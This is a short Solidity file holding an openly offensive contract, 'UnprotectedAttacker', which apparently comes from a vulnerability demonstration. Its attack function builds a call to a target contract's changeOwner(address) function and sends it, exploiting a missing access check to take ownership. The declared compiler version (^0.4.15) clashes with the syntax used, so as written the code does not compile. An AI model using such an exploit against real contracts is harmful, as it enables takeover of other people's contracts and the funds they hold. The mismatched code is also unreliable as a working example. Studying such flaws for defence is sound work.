 pragma solidity ^0.4.15;

 contract UnprotectedAttacker{
    
    address target;

    constructor(address _target) public {
        target = _target;
    }

    function attack(address newOwner) public {
        bytes memory data = abi.encodeWithSelector(bytes4(keccak256("changeOwner(address)")), newOwner);
        (bool success, ) = target.call(data);
        require(success, "Call failed");
    }

 }
